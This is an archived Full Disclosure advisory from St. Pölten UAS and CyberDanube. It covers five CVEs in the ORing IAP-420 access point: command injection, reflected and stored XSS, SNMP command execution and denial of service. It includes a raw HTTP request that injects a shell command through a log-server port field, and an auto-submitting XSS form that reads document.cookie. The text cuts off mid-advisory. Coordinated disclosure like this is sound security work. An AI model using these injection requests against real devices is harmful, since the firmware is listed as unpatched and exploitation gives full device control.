---
title: St. Poelten UAS | Multiple Vulnerabilities in ORing IAP
url: https://seclists.org/fulldisclosure/2024/Dec/3
source: Full Disclosure
date: 2024-12-13
fetch_date: 2025-10-06T19:41:13.064324
---

# St. Poelten UAS | Multiple Vulnerabilities in ORing IAP

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

![](/shared/images/nst-icons.svg#search)

# St. Poelten UAS | Multiple Vulnerabilities in ORing IAP

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 10 Dec 2024 16:39:30 +0000

---

```
St. Pölten UAS 20241209-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities in ORing IAP
              product| ORing IAP-420
   vulnerable version| 2.01e
        fixed version| -
           CVE number| CVE-2024-55544, CVE-2024-55545, CVE-2024-55546,
                     | CVE-2024-55547, CVE-2024-55548
               impact| High
             homepage| https://oringnet.com/
                found| 2024-05-24
                   by| P. Chistè, A. Falb, M. Selinger, M. Suchy,
                     | P. Oberndorfer, P. Maluenda, D. Sagl,
                     | M. Narbeshuber-Spletzer, J. Springer, P. Riedl,
                     | C. Hierzer, M. Pammer
                     | These vulnerabilities were discovery during research at
                     | St.Pölten UAS, supported and coordinated by CyberDanube.
                     |
                     | https://fhstp.ac.at | https://cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Founded in 2005, ORing specializes in developing innovative own-branded
products for industrial settings. Over the years, ORing has accumulated
abundant experience in wired and wireless network communications industry. In
line with the commercialization of 5G, ORing has stretched its arm into the
IIoT field, helping customers realize all kinds of IIoT applications such as
smart manufacturing, smart city, and industrial automation. With high product
quality and best customer services in mind, ORing has continued to launch
cutting-edge products catering to customer needs. ORing's products have been
widely adopted in surveillance, rail transport, industrial automation, power
substations, renewable energy, and marine industries with offices worldwide to
address customer needs in real time."

Source: https://oringnet.com/en/about-us/company-profile

Vulnerable versions
-------------------------------------------------------------------------------
IAP-420 / 2.01e

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection (CVE-2024-55544)
A command injection was identified on the webserver. This vulnerability can
only be exploited if a user is authenticated on the web interface. This way,
an attacker can invoke commands and is able to get full control over the whole
device.

2) Reflected Cross-Site Scripting (CVE-2024-55545)
A reflected cross-site scripting vulnerability is present on the sub page
"even_log.cgi", which is used to display event logs. It can be exploited in the
context of a victim's session.

3) Stored Cross-Site Scripting (CVE-2024-55546)
A stored cross-site scripting vulnerability has been identified in the
firmware of the device. It was identified in the device properties and can be
exploited in the context of a victim's session.

4) Remote Command Execution via SNMP (CVE-2024-55547)
SNMP allows to write the nsExtendObjects. This enables an attacker to execute
commands on the operating system of the device.

5) Denial of Service (CVE-2024-55548)
A denial of service (DoS) condition can be reached if a password with more than
16 characters is set in a user account. This is only possible as authenticated
user and by disabling the lenght check in the input fields.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection (CVE-2024-55544)
The following GET request creates a file named "test" in the "/tmp" directory.

-------------------------------------------------------------------------------
POST /cgi-bin/even_log.cgi HTTP/1.1
Host: 10.69.10.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 553
Origin: http://10.69.10.2
Connection: keep-alive
Referer: http://10.69.10.2/cgi-bin/even_log.cgi
Cookie: <auth-cookie>
Upgrade-Insecure-Requests: 1

tf_logserver_ip=10.10.10.0&tf_logserver_port=;touch%20/tmp/test&Submit=Apply&
ret_msg=&lang=en&h_ColdLog=off&h_WarmLog=off&h_AuthLog=off&h_IpLog=off&
h_PwdLog=off&h_RedundantPowerLog=&h_LinkChangedLog=off&
h_SNMPAccessFailedLog=off&h_WlcAssociatedLog=off&h_WlcDisassociatedLog=off&
h_CliAssociatedLog=off&h_CliDisassociatedLog=off&h_CliRoamingLog=off&
h_Power1FaultLog=&h_Power2FaultLog=&h_POEFaultLog=&h_Eth1LinkDownLog=off&
h_Eth2LinkDownLog=off&h_DI1LtoHLog=&h_DI2LtoHLog=&h_DI3LtoHLog=&h_DI4LtoHLog=&
h_DI1HtoLLog=&h_DI2HtoLLog=&h_DI3HtoLLog=&h_DI4HtoLLog=
-------------------------------------------------------------------------------

This way, the file "/tmp/test" gets created on the filesystem.

2) Reflected Cross-Site Scripting (CVE-2024-55545)
The following payload can be used to trigger a Cross-Site Scripting:
"><script >alert(document.cookie)</script >

This has been implemented as HTML file as simple Proof-of-Concept:
-------------------------------------------------------------------------------
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <form id="xssForm" action="http://10.69.10.2/cgi-bin/even_log.cgi"; method="POST">
        <input type="hidden" name="tf_logserver_ip"
value="&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;">
        <input type="hidden" name="tf_logserver_port" value="66">
        <input type="hidden" name="Submit" value="Apply">
        <input type="hidden" name="ret_msg" value="">
        <input type="hidden" name="lang" value="en">
        <input type="hidden" name="h_ColdLog" value="off">
        <input type="hidden" name="h_WarmLog" value="off">
        <input type="hidden" name="h_AuthLog" value="off">
        <input type="hidden" name="h_IpLog" value="off">
        <input type="hidden" name="h_PwdLog" value="off">
        <input type="hidden" name="h_LinkChangedLog" value="off">
        <input type="hidden" name="h_SNMPAccessFailedLog" value="off">
        <input type="hidden" name="h_WlcAssociatedLog" value="off">
        <input type="hidden" name="h_WlcDisassociatedLog" value="off">
        <input type="hidden" name="h_CliAssociatedLog" value="off">
        <input type="hidden" name="h_CliDisassociatedLog" value="off">
        <input type="hidden" name="h_CliRoamingLog" value="off">
        <input type="hidden" name="h_Eth1LinkDownLog" value="off">
        <input type="hidden" name="h_Eth2LinkDownLog" value="off">
    </form>
    <script>
        document.getElementById('xssForm').submit();
    </script>
</body>
</html>
-------------------------------------------------------------------------------

3) Stored Cross-Site Scripting (CVE-2024-55546)
Permanent Java...